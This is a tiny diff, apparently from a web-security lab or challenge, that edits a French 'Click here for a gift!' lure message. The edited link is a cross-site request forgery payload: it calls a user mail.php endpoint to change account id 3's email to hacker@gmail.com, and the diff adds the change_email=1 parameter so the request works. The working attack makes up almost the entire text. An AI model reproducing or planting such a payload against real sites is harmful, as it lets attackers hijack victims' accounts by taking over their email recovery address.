@@ -1,2 +1,1 @@
-Bravo
-<a href="https://www/functions/user/mail.php?id=3&new_email=hacker@gmail.com">Cliquez ici pour un cadeau!</a>
+Bravo, <a href="/pages/user/mail.php?id=3&new_email=hacker@gmail.com&change_email=1">Cliquez ici pour un cadeau!</a>
